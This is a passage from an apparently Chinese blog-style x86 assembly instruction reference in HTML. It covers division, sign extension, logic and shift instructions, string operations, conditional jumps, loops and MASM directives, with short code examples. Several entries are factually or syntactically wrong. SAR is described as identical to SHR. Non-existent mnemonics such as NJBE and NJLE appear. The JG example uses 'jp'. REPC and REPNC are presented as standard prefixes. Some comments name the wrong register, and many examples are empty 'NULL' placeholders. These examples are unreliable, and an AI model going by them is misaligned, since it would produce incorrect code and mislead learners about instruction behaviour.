乘法的ASCII码调整"></a>AAM 乘法的ASCII码调整</h3><pre class=" language-c++"><code class="language-c++">var byte 05h,06hmov bl,var;第一个操作数mov bl,[var+1];第二个操作数mul bl;AX=001Ehaam;AX=0300h</code></pre><h3 id="DIV-无符号除法"><a href="#DIV-无符号除法" class="headerlink" title="DIV 无符号除法"></a>DIV 无符号除法</h3><pre class=" language-c++"><code class="language-c++">mov ax,0083h;被除数mov bl,2;除数div bl;AL=41h,AH=01h</code></pre><h3 id="IDIV-整数除法"><a href="#IDIV-整数除法" class="headerlink" title="IDIV 整数除法"></a>IDIV 整数除法</h3><pre class=" language-c++"><code class="language-c++">var sword -101;009Bhmov dx,0mov ax,var;DX:AX=0000009Bh(+155)mov bx,2;BX是除数idiv bx;DX:AX除以BX    var sword -48mov al,var;被除数低字节cbw；AL扩展到AHmov bl,+5;除数idiv bl;AL=-9,AH=-3</code></pre><h3 id="以上两条-结果回送"><a href="#以上两条-结果回送" class="headerlink" title="以上两条,结果回送:"></a>以上两条,结果回送:</h3><h3 id="商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算"><a href="#商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算" class="headerlink" title="商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)"></a>商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)</h3><h3 id="AAD-除法的ASCII码调整"><a href="#AAD-除法的ASCII码调整" class="headerlink" title="AAD 除法的ASCII码调整"></a>AAD 除法的ASCII码调整</h3><pre class=" language-c++"><code class="language-c++">var byte ?var2 byte ?mov ax,0307h;被除数aad;AX=0025hmov bl,5;除数div bl;AX=0207hmov var,almov var2,ah</code></pre><h3 id="CBW-字节转换为字-把AL中字节的符号扩展到AH中去"><a href="#CBW-字节转换为字-把AL中字节的符号扩展到AH中去" class="headerlink" title="CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)"></a>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</h3><pre class=" language-c++"><code class="language-c++">var sword -101;9Bhmov al,var;AL=9Bhcbw;AL=FF9Bh</code></pre><h3 id="CWD-字转换为双字-把AX中的字的符号扩展到DX中去"><a href="#CWD-字转换为双字-把AX中的字的符号扩展到DX中去" class="headerlink" title="CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)"></a>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</h3><pre class=" language-c++"><code class="language-c++">var sword -101;FF9Bhmov ax,var;AX=FF9Bhcwd;DX:AX=FFFFFF9Bh</code></pre><h3 id="CWDE-字转换为双字-把AX中的字符号扩展到EAX中去"><a href="#CWDE-字转换为双字-把AX中的字符号扩展到EAX中去" class="headerlink" title="CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)"></a>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去"><a href="#CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去" class="headerlink" title="CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)"></a>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</h3><pre class=" language-C++"><code class="language-C++">var sword -101;FFFFFF9Bhmov eax,var;EDX:EAX=FFFFFFFFFFFFFF9Bhcdq</code></pre><h1 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h1><h3 id="AND-与运算"><a href="#AND-与运算" class="headerlink" title="AND 与运算"></a>AND 与运算</h3><pre class=" language-c++"><code class="language-c++">mov al,10101110band al,11110110b;消除位0,3</code></pre><h3 id="OR-或运算"><a href="#OR-或运算" class="headerlink" title="OR 或运算"></a>OR 或运算</h3><pre class=" language-c++"><code class="language-c++">mov al,11100011bor al,00000100b;位2置1</code></pre><h3 id="XOR-异或运算"><a href="#XOR-异或运算" class="headerlink" title="XOR 异或运算"></a>XOR 异或运算</h3><pre class=" language-c++"><code class="language-c++">mov al,10110101bxor al,0;异或</code></pre><h3 id="NOT-取反"><a href="#NOT-取反" class="headerlink" title="NOT 取反"></a>NOT 取反</h3><pre class=" language-c++"><code class="language-c++">mov al,10101110bnot al;补集</code></pre><h3 id="TEST-测试-两操作数作与运算-仅修改标志位-不回送结果"><a href="#TEST-测试-两操作数作与运算-仅修改标志位-不回送结果" class="headerlink" title="TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)"></a>TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)</h3><pre class=" language-c++"><code class="language-c++">test al,00001001b;测试0,3位</code></pre><h3 id="SHL-逻辑左移-位元乘法"><a href="#SHL-逻辑左移-位元乘法" class="headerlink" title="SHL 逻辑左移,位元乘法"></a>SHL 逻辑左移,位元乘法</h3><pre class=" language-c++"><code class="language-c++">mov bl,8Fh;BL=10001111bshl bl,1;CF=1,BL=00011110b</code></pre><h3 id="SAL-算术左移-SHL"><a href="#SAL-算术左移-SHL" class="headerlink" title="SAL 算术左移(=SHL)"></a>SAL 算术左移(=SHL)</h3><pre class=" language-c++"><code class="language-c++">sal/shl</code></pre><h3 id="SHR-逻辑右移，位元除法"><a href="#SHR-逻辑右移，位元除法" class="headerlink" title="SHR 逻辑右移，位元除法"></a>SHR 逻辑右移，位元除法</h3><pre class=" language-c++"><code class="language-c++">mov al,0D0h;AL=11010000bshr al,1;AL=01101000b,CF=0</code></pre><h3 id="SAR-算术右移-SHR"><a href="#SAR-算术右移-SHR" class="headerlink" title="SAR 算术右移(=SHR)"></a>SAR 算术右移(=SHR)</h3><pre class=" language-c++"><code class="language-c++">sar/shr</code></pre><h3 id="ROL-循环左移"><a href="#ROL-循环左移" class="headerlink" title="ROL 循环左移"></a>ROL 循环左移</h3><pre class=" language-C++"><code class="language-C++">mov al,40h;AL=01000000brol al,1;AL=10000000brol al,3;AL=00000100b</code></pre><h3 id="ROR-循环右移"><a href="#ROR-循环右移" class="headerlink" title="ROR 循环右移"></a>ROR 循环右移</h3><pre class=" language-c++"><code class="language-c++">mov al,01h;AL=00000001bror al,1;AL=10000000bror al,3;AL=00010000b</code></pre><h3 id="RCL-通过进位的循环左移"><a href="#RCL-通过进位的循环左移" class="headerlink" title="RCL 通过进位的循环左移"></a>RCL 通过进位的循环左移</h3><pre class=" language-c++"><code class="language-c++">clc;CF=0mov bl,88h;CF,BL=0 10001000brcl bl,1;CF,BL=1 00010000brcl bl,1;CF,BL=0 00100010b</code></pre><h3 id="RCR-通过进位的循环右移"><a href="#RCR-通过进位的循环右移" class="headerlink" title="RCR 通过进位的循环右移"></a>RCR 通过进位的循环右移</h3><pre class=" language-c++"><code class="language-c++">stc ;CF=1mov ah,10h;AH,CF=00010000 1rcr ah,1;AH,CF=10001000 0</code></pre><p>以上八种移位指令,其移位次数可达255次</p><p>移位一次时, 可直接用操作码. 如 SHL AX,1</p><p>移位&gt;1次时, 则由寄存器CL给出移位次数</p><p>如 MOV CL,04 SHL AX,CL</p><h3 id="SHLD-双精度左移"><a href="#SHLD-双精度左移" class="headerlink" title="SHLD 双精度左移"></a>SHLD 双精度左移</h3><pre class=" language-c++"><code class="language-c++">wval word 9BA6hmov ax,0AC36hshld wval,ax,4;wval=BA6Ah,将wval左移4位，并把AX的高4位插入wval的低4位</code></pre><h3 id="SHRD-双精度右移"><a href="#SHRD-双精度右移" class="headerlink" title="SHRD 双精度右移"></a>SHRD 双精度右移</h3><pre class=" language-c++"><code class="language-c++">mov ax,234Bhmov dx,7654hshrd ax,dx,4;AX右移4位，并把DX的低4位插入AX的高4位</code></pre><h1 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h1><h3 id="DS-SI-源串段寄存器-源串变址"><a href="#DS-SI-源串段寄存器-源串变址" class="headerlink" title="DS:SI 源串段寄存器 :源串变址"></a>DS:SI 源串段寄存器 :源串变址</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="ESI-目标串段寄存器-目标串变址"><a href="#ESI-目标串段寄存器-目标串变址" class="headerlink" title="ESI 目标串段寄存器:目标串变址"></a>ESI 目标串段寄存器:目标串变址</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="CX-重复次数计数器"><a href="#CX-重复次数计数器" class="headerlink" title="CX 重复次数计数器"></a>CX 重复次数计数器</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="AL-AX-扫描值"><a href="#AL-AX-扫描值" class="headerlink" title="AL/AX 扫描值"></a>AL/AX 扫描值</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量"><a href="#D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量" class="headerlink" title="D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量"></a>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="Z标志-用来控制扫描或比较操作的结束"><a href="#Z标志-用来控制扫描或比较操作的结束" class="headerlink" title="Z标志 用来控制扫描或比较操作的结束"></a>Z标志 用来控制扫描或比较操作的结束</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字"><a href="#MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字" class="headerlink" title="MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )"></a>MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )</h3><pre class=" language-c++"><code class="language-c++">;传送字符串数据：将ESI寻址的内存数据复制到EDI寻址的内存位置;复制双字数值source dword 20 dup(0FFFFFFFh)target dword 20 dup(?).codecld;方向为正mov ecx,lengthof source;设置REP计数器mov esi,offset source;ESI指向sourcemov edi,offset target;EDI指向targetrep movsd;复制双字</code></pre><h3 id="CMPS-串比较-CMPSB-比较字符-CMPSW-比较字"><a href="#CMPS-串比较-CMPSB-比较字符-CMPSW-比较字" class="headerlink" title="CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )"></a>CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )</h3><pre class=" language-c++"><code class="language-c++">;比较字符串：比较分别由ESI和EDI寻址的内存数据;比较双字mov esi OFFSET sourcemov edi ,OFFSET targetcld;方向为正向mov ecx, LENGTHOF source;设置重复计数器repe cmpsd;相等则重复</code></pre><h3 id="SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位"><a href="#SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位" class="headerlink" title="SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位"></a>SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位</h3><pre class=" language-c++"><code class="language-c++">;扫描字符串：比较累加器（AL、AX和EAX）与EDI寻址的内存数据;扫描是否有匹配字符alpha BYTE "ABCDEFGH",0.codemov edi,OFFSET alpha;EDI指向字符串mov al,'F';检索字符Fmov ecx,LENGTHOF alpha;设置检索计数器cld;方向为正向repne scasb;不相等则重复jnz quit;若未发现字符则退出dec edi;发现字符: EDI减1</code></pre><h3 id="LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字"><a href="#LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字" class="headerlink" title="LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )"></a>LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )</h3><pre class=" language-c++"><code class="language-c++">;从字符串加载到累加器：将ESI寻址的内存数据加载到累加器;数组乘法:本程序将一个32位整数数组中的每个元素都乘以一个常数。INCLUDE Irvine32. inc.dataarray DWORD 1,2,3,4,5,6,7,8,9,10;测试数据multiplier DWORD 10;测试数据.codemain PROC    cld;方向为正向    mov esi,OFFSET array;源数组索引    mov edi,esi;目标数组索引    mov ecx,LENGTHOF array;循环计数器Ll: lodsd;将[ESI]加载到EAX    mul multiplier;与常数相乘    stosd;将EAX保存到[EDI]    loop Ll    exitmain ENDPEND main</code></pre><h3 id="STOS-保存串-是LODS的逆过程"><a href="#STOS-保存串-是LODS的逆过程" class="headerlink" title="STOS 保存串   是LODS的逆过程"></a>STOS 保存串   是LODS的逆过程</h3><pre class=" language-c++"><code class="language-c++">;保存字符串数据L：将累加器内容保存到EDI寻址的内存位置.dataCount = 100string1 BYTE Count DUP(?).codemov al,OFFh;要保存的数值mov edi,OFFSET string1;EDI指向目标字符串mov ecx,Count;字符计数器cld;方向为正向rep stosb;用AL的内容实现填充</code></pre><h3 id="REP-当CX-ECX-lt-gt-0时重复-单个指令处理整个字符串"><a href="#REP-当CX-ECX-lt-gt-0时重复-单个指令处理整个字符串" class="headerlink" title="REP 当CX/ECX&lt;&gt;0时重复(单个指令处理整个字符串)"></a>REP 当CX/ECX&lt;&gt;0时重复(单个指令处理整个字符串)</h3><pre class=" language-c++"><code class="language-c++">rep movsb</code></pre><h3 id="REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX-lt-gt-0时重复"><a href="#REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX-lt-gt-0时重复" class="headerlink" title="REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复"></a>REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复</h3><pre class=" language-c++"><code class="language-c++">repe cmpsd</code></pre><h3 id="REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX-lt-gt-0时重复"><a href="#REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX-lt-gt-0时重复" class="headerlink" title="REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复"></a>REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复</h3><pre class=" language-c++"><code class="language-c++">repne scasb</code></pre><h3 id="REPC-当CF-1且CX-ECX-lt-gt-0时重复"><a href="#REPC-当CF-1且CX-ECX-lt-gt-0时重复" class="headerlink" title="REPC 当CF=1且CX/ECX&lt;&gt;0时重复"></a>REPC 当CF=1且CX/ECX&lt;&gt;0时重复</h3><pre class=" language-c++"><code class="language-c++">repc movsb</code></pre><h3 id="REPNC-当CF-0且CX-ECX-lt-gt-0时重复"><a href="#REPNC-当CF-0且CX-ECX-lt-gt-0时重复" class="headerlink" title="REPNC 当CF=0且CX/ECX&lt;&gt;0时重复"></a>REPNC 当CF=0且CX/ECX&lt;&gt;0时重复</h3><pre class=" language-c++"><code class="language-c++">repnc movsb</code></pre><h1 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h1><h2 id="简单的条件转移指令"><a href="#简单的条件转移指令" class="headerlink" title="简单的条件转移指令"></a>简单的条件转移指令</h2><h3 id="JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转"><a href="#JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转" class="headerlink" title="JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转"></a>JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转</h3><pre class=" language-c++"><code class="language-c++">cmp eax,0jz/je L1;如果ZF=1则跳转</code></pre><h3 id="JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转"><a href="#JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转" class="headerlink" title="JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转"></a>JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转</h3><pre class=" language-c++"><code class="language-c++">and dl,10110000bjnz/jne L2;ZF=0跳转</code></pre><h3 id="JS-OPR———————-结果为负转移-测试条件SF-1"><a href="#JS-OPR———————-结果为负转移-测试条件SF-1" class="headerlink" title="JS OPR———————-结果为负转移, 测试条件SF=1"></a>JS OPR———————-结果为负转移, 测试条件SF=1</h3><pre class=" language-c++"><code class="language-c++">SF=1</code></pre><h3 id="JNS-OPR———————结果为正转移-测试条件SF-0"><a href="#JNS-OPR———————结果为正转移-测试条件SF-0" class="headerlink" title="JNS OPR———————结果为正转移, 测试条件SF=0"></a>JNS OPR———————结果为正转移, 测试条件SF=0</h3><pre class=" language-c++"><code class="language-c++">SF=0</code></pre><h3 id="JO-OPR———————-溢出转移-测试条件OF-1"><a href="#JO-OPR———————-溢出转移-测试条件OF-1" class="headerlink" title="JO OPR——————— 溢出转移,   测试条件OF=1"></a>JO OPR——————— 溢出转移,   测试条件OF=1</h3><pre class=" language-c++"><code class="language-c++">OF=1</code></pre><h3 id="JNO-OPR-——————–不溢出转移-测试条件OF-0"><a href="#JNO-OPR-——————–不溢出转移-测试条件OF-0" class="headerlink" title="JNO OPR ——————–不溢出转移 , 测试条件OF=0"></a>JNO OPR ——————–不溢出转移 , 测试条件OF=0</h3><pre class=" language-c++"><code class="language-c++">OF=0</code></pre><h3 id="JP-OPR-———————结果为偶转移-测试条件PF-1"><a href="#JP-OPR-———————结果为偶转移-测试条件PF-1" class="headerlink" title="JP OPR ———————结果为偶转移, 测试条件PF=1"></a>JP OPR ———————结果为偶转移, 测试条件PF=1</h3><pre class=" language-c++"><code class="language-c++">PF=1</code></pre><h3 id="JNP-OPR-——————–结果为奇转移-测试条件PF-0"><a href="#JNP-OPR-——————–结果为奇转移-测试条件PF-0" class="headerlink" title="JNP OPR ——————–结果为奇转移 , 测试条件PF=0"></a>JNP OPR ——————–结果为奇转移 , 测试条件PF=0</h3><pre class=" language-c++"><code class="language-c++">PF=0</code></pre><h3 id="JC-OPR-——————–-有进位转移-测试条件CF-1"><a href="#JC-OPR-——————–-有进位转移-测试条件CF-1" class="headerlink" title="JC OPR ——————– 有进位转移 , 测试条件CF=1"></a>JC OPR ——————– 有进位转移 , 测试条件CF=1</h3><pre class=" language-c++"><code class="language-c++">CF=1</code></pre><h3 id="JNC-OPR-——————–无进位转移-测试条件CF-0"><a href="#JNC-OPR-——————–无进位转移-测试条件CF-0" class="headerlink" title="JNC OPR ——————–无进位转移,  测试条件CF=0"></a>JNC OPR ——————–无进位转移,  测试条件CF=0</h3><pre class=" language-c++"><code class="language-c++">CF=0</code></pre><h3 id="无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移"><a href="#无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移" class="headerlink" title="无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)"></a>无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)</h3><h3 id="JB-或JNAE-opd-————–小于或者不大于等于则转移"><a href="#JB-或JNAE-opd-————–小于或者不大于等于则转移" class="headerlink" title="JB(或JNAE) opd ————–小于或者不大于等于则转移"></a>JB(或JNAE) opd ————–小于或者不大于等于则转移</h3><pre class=" language-c++"><code class="language-c++">小于跳转</code></pre><h3 id="JNB-或JAE-opd—————不小于或者大于等于则转移"><a href="#JNB-或JAE-opd—————不小于或者大于等于则转移" class="headerlink" title="JNB(或JAE) opd—————不小于或者大于等于则转移"></a>JNB(或JAE) opd—————不小于或者大于等于则转移</h3><pre class=" language-c++"><code class="language-c++">不小于跳转</code></pre><h3 id="JA-或NJBE-OPD—————大于或者不小于等于则转移"><a href="#JA-或NJBE-OPD—————大于或者不小于等于则转移" class="headerlink" title="JA(或NJBE) OPD—————大于或者不小于等于则转移"></a>JA(或NJBE) OPD—————大于或者不小于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov al,+127cmp al,-128    ja/njbe L1;不跳转</code></pre><h3 id="JNA-或JBE-OPD—————不大于或者小于等于则转移"><a href="#JNA-或JBE-OPD—————不大于或者小于等于则转移" class="headerlink" title="JNA(或JBE) OPD—————不大于或者小于等于则转移"></a>JNA(或JBE) OPD—————不大于或者小于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov al,+127cmp al,-128    jna/jbe L1;跳转</code></pre><h3 id="带符号比较条件转移指令"><a href="#带符号比较条件转移指令" class="headerlink" title="带符号比较条件转移指令"></a>带符号比较条件转移指令</h3><h3 id="JL-或JNGE-————–小于或者不大于等于则转移"><a href="#JL-或JNGE-————–小于或者不大于等于则转移" class="headerlink" title="JL(或JNGE) ————–小于或者不大于等于则转移"></a>JL(或JNGE) ————–小于或者不大于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov ax,5mov ax,6    jl/jnge L1;跳转</code></pre><h3 id="JNL-或JGE-————–不小于或者大于等于则转移"><a href="#JNL-或JGE-————–不小于或者大于等于则转移" class="headerlink" title="JNL(或JGE)————–不小于或者大于等于则转移"></a>JNL(或JGE)————–不小于或者大于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov edx,-1cmp edx,0    jnl/jge L1;不跳转</code></pre><h3 id="JG-或NJLE-—————大于或者不小于等于则转移"><a href="#JG-或NJLE-—————大于或者不小于等于则转移" class="headerlink" title="JG(或NJLE)—————大于或者不小于等于则转移"></a>JG(或NJLE)—————大于或者不小于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov ax,5cmp ax,4    jp/njle L1;大于则跳转</code></pre><h3 id="JNG-或JLE-—————不大于或者小于等于则转移"><a href="#JNG-或JLE-—————不大于或者小于等于则转移" class="headerlink" title="JNG(或JLE)—————不大于或者小于等于则转移"></a>JNG(或JLE)—————不大于或者小于等于则转移</h3><pre class=" language-c++"><code class="language-c++">mov ecx,0cmp ecx,0    jng/jle;跳转</code></pre><h3 id="JCXZ"><a href="#JCXZ" class="headerlink" title="JCXZ"></a>JCXZ</h3><pre class=" language-c++"><code class="language-c++">CX=0跳转</code></pre><h3 id="JECXZ"><a href="#JECXZ" class="headerlink" title="JECXZ"></a>JECXZ</h3><pre class=" language-c++"><code class="language-c++">ECX=0跳转</code></pre><h3 id="JRCXZ"><a href="#JRCXZ" class="headerlink" title="JRCXZ"></a>JRCXZ</h3><pre class=" language-c++"><code class="language-c++">RCX=0跳转</code></pre><h2 id="调用子程序与返回指令"><a href="#调用子程序与返回指令" class="headerlink" title="调用子程序与返回指令"></a>调用子程序与返回指令</h2><h3 id="CALL-子程序调用指令"><a href="#CALL-子程序调用指令" class="headerlink" title="CALL  子程序调用指令"></a>CALL  子程序调用指令</h3><pre class=" language-c++"><code class="language-c++">call SumOf;调用SumOf过程</code></pre><h3 id="RET-子程序返回指令"><a href="#RET-子程序返回指令" class="headerlink" title="RET 子程序返回指令"></a>RET 子程序返回指令</h3><pre class=" language-c++"><code class="language-c++">SumOf proc    .    .    retSumOf endp</code></pre><h2 id="条件循环指令"><a href="#条件循环指令" class="headerlink" title="条件循环指令"></a>条件循环指令</h2><h3 id="LOOP———-按ECX计算器循环"><a href="#LOOP———-按ECX计算器循环" class="headerlink" title="LOOP———-按ECX计算器循环"></a>LOOP———-按ECX计算器循环</h3><pre class=" language-c++"><code class="language-c++">    mov ax,0    mov ecx,5L1:    inc ax    loop L1;每次循环ax加一，循环5次</code></pre><h3 id="LOOPZ————为零跳转"><a href="#LOOPZ————为零跳转" class="headerlink" title="LOOPZ————为零跳转"></a>LOOPZ————为零跳转</h3><pre class=" language-c++"><code class="language-c++">loopz L1</code></pre><h3 id="LOOPNZ————–非零跳转"><a href="#LOOPNZ————–非零跳转" class="headerlink" title="LOOPNZ————–非零跳转"></a>LOOPNZ————–非零跳转</h3><pre class=" language-c++"><code class="language-c++">loopnz L1</code></pre><h3 id="LOOPE——————-相等跳转"><a href="#LOOPE——————-相等跳转" class="headerlink" title="LOOPE——————-相等跳转"></a>LOOPE——————-相等跳转</h3><pre class=" language-c++"><code class="language-c++">loope L1</code></pre><h3 id="LOOPNE——————-不等跳转"><a href="#LOOPNE——————-不等跳转" class="headerlink" title="LOOPNE——————-不等跳转"></a>LOOPNE——————-不等跳转</h3><pre class=" language-c++"><code class="language-c++">loopne L1</code></pre><h3 id="IF-ELSE-ELSEIF-ENDIF"><a href="#IF-ELSE-ELSEIF-ENDIF" class="headerlink" title=".IF .ELSE .ELSEIF .ENDIF"></a>.IF .ELSE .ELSEIF .ENDIF</h3><pre class=" language-c++"><code class="language-c++">.IF conditionl    statements[.ELSELF condition2    statements][ELSE     statements].ENDIF</code></pre><h3 id="REPEAT-WHILE"><a href="#REPEAT-WHILE" class="headerlink" title=".REPEAT .WHILE"></a>.REPEAT .WHILE</h3><pre class=" language-c++"><code class="language-c++">.REPEAT     statements.UNTIL condition    .WHILE condition    statements.ENDW</code></pre><h2 id="其它指令"><a href="#其它指令" class="headerlink" title="其它指令"></a>其它指令</h2><h3 id="OFFSET-——————–-返回偏移地址"><a href="#OFFSET-——————–-返回偏移地址" class="headerlink" title="OFFSET ——————– 返回偏移地址"></a>OFFSET ——————– 返回偏移地址</h3><pre class=" language-c++"><code class="language-c++">mov esi,offset var1;  esi=00404000hmov esi,offset var2;  esi=00404000h</code></pre><h3 id="SEG-——————–-返回段地址"><a href="#SEG-——————–-返回段地址" class="headerlink" title="SEG  ——————– 返回段地址"></a>SEG  ——————– 返回段地址</h3><pre class=" language-c++"><code class="language-c++">mov esi,seg var1mov esi,seg var2</code></pre><h3 id="EQU-——————–-等值语句"><a href="#EQU-——————–-等值语句" class="headerlink" title="EQU(=) ——————– 等值语句"></a>EQU(=) ——————– 等值语句</h3><pre class=" language-c++"><code class="language-c++">name EQU expressionname EQU symbolname EQU <text>    pressKey EQU <"Press any key to continue...", 0>matrix1 EQU 10 * 10matrix2 EQU <10 * 10></code></pre><h3 id="PURGE-——————–-解除语句"><a href="#PURGE-——————–-解除语句" class="headerlink" title="PURGE ——————– 解除语句"></a>PURGE ——————– 解除语句</h3><pre class=" language-c++"><code class="language-c++">PURGE，标识符1，标识符2，...，标识符n</code></pre><h3 id="DUP-——————–-操作数字段用复制操作符"><a href="#DUP-——————–-操作数字段用复制操作符" class="headerlink" title="DUP  ——————– 操作数字段用复制操作符"></a>DUP  ——————– 操作数字段用复制操作符</h3><pre class=" language-c++"><code class="language-c++">db x dup();x是重复的次数，（）里是要重复的数逗号分隔str1 db 10 dup ('!@#') ;这就是十个！@#格式：db 重复的次数 dup (重复的内容)buf1 db 100 dup(?);开辟100个字节的内存区</code></pre><h3 id="SEGMENT-ENDS-——————–-段定义指令"><a href="#SEGMENT-ENDS-——————–-段定义指令" class="headerlink" title="SEGMENT,ENDS ——————– 段定义指令"></a>SEGMENT,ENDS ——————– 段定义指令</h3><pre class=" language-c++"><code class="language-c++">segment_name SEGMENT 【定位类型】 【组合类型】 【类别名】···;here is your codesegment ends</code></pre><h3 id="ASSUME-——————–-段地址分配指令"><a href="#ASSUME-——————–-段地址分配指令" class="headerlink" title="ASSUME ——————– 段地址分配指令"></a>ASSUME ——————– 段地址分配指令</h3><pre class=" language-c++"><code class="language-c++">.data　　.........code　　........　　assume cs:code,ds:datastart: .......　　mov ax,data　　mov ds,ax　　...endsend start</code></pre><h3 id="ORG-——————–-起始偏移地址设置指令"><a href="#ORG-——————–-起始偏移地址设置指令" class="headerlink" title="ORG  ——————– 起始偏移地址设置指令"></a>ORG  ——————– 起始偏移地址设置指令</h3><pre class=" language-c++"><code class="language-c++">ORG 0000HAJMP MAINORG 0030H</code></pre><h3 id="——————–地址计数器的当前值"><a href="#——————–地址计数器的当前值" class="headerlink" title="$   ——————–地址计数器的当前值"></a>$   ——————–地址计数器的当前值</h3><pre class=" language-c++"><code class="language-c++">例如JNE+6，能引用地址计数器的值，每次引用会使地址计数器的值发生改变，地址计数器即当前指令的偏移地址。该指令的转向地址即JNE指令的首地址加6。</code></pre><h3 id="PROC，ENDP-——————–-过程定义语句"><a href="#PROC，ENDP-——————–-过程定义语句" class="headerlink" title="PROC，ENDP ——————– 过程定义语句"></a>PROC，ENDP ——————– 过程定义语句</h3><pre class=" language-c++"><code class="language-c++">SumOf proc    .    .    .    retSumOf endp;这是一个过程</code></pre><h3 id="NAME，TITLE，END-——————–-程序开始结束语句"><a href="#NAME，TITLE，END-——————–-程序开始结束语句" class="headerlink" title="NAME，TITLE，END ——————– 程序开始结束语句"></a>NAME，TITLE，END ——————– 程序开始结束语句</h3><pre class=" language-c++"><code class="language-c++">NULL</code></pre><h3 id="MACRO，ENDM-——————–宏定义指令"><a href="#MACRO，ENDM-——————–宏定义指令" class="headerlink" title="MACRO，ENDM  ——————–宏定义指令"></a>MACRO，ENDM  ——————–宏定义指令</h3><pre class=" language-c++"><code class="language-c++">mPutchar MACRO char    push eax    mov al,char    call WriteChar    pop eax    ENDM</code></pre><h3 id="XLAT-（TRANSLATE）-——————–-换码指令—"><a href="#XLAT-（TRANSLATE）-——————–-换码指令—" class="headerlink" title="XLAT  （TRANSLATE） ——————– 换码指令—-"></a>XLAT  （TRANSLATE） ——————– 换码指令—-</h3><pre class=" language-c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat</code></pre><h3 id="ALIGN-———————伪指令"><a href="#ALIGN-———————伪指令" class="headerlink" title="ALIGN ———————伪指令"></a>ALIGN ———————伪指令</h3><pre class=" language-c++"><code class="language-c++">var byte ?; 00404000hALIGN 2var2 byte ?; 00404002</code></pre><h3 id="PTR-———————-运算符"><a href="#PTR-———————-运算符" class="headerlink" title="PTR ———————-运算符"></a>PTR ———————-运算符</h3><pre class=" language-c++"><code class="language-c++">var dword 12345678hmov ax,word ptr var; 将低16位(5678)送入ax</code></pre><h3 